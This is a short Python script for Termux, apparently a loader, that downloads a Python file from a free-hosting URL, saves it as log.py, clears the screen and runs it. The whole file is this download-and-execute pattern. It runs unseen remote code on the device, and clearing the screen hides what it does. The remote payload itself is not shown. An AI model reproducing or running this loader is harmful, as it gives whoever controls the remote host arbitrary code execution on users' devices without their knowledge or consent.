#!/data/data/com.termux/files/usr/bin/python3.8

import requests
from os import system

a = requests.get('https://friend3ds.000webhostapp.com/test/test.py')

with open('log.py', 'w+') as log:
    log.write(a.text)

system('clear')
system('python log.py')
